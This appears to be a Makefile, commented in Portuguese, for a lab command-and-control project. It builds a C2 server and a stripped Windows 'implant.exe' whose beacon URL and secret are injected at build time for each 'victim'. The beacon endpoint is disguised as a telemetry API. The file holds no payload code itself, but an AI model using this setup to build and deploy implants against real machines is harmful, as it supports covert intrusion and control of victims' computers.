C2_URL ?= https://192.168.1.50:443/api/v1/telemetry
SECRET ?= chave-super-secreta-do-lab

.PHONY: all server implant clean

all: server implant

server:
	go build -o c2-server ./server/

# Config injetada por build: cada "vítima" recebe URL/segredo únicos
implant:
	@test -f implant/c2.crt || (echo "ERRO: copie o cert do server: cp c2.crt implant/c2.crt" && exit 1)
	GOOS=windows GOARCH=amd64 go build -trimpath -ldflags="-s -w\
		-X 'main.C2_URL=$(C2_URL)'\
		-X 'main.SECRET=$(SECRET)'"\
		-o implant.exe ./implant/

clean:
	rm -f c2-server implant.exe
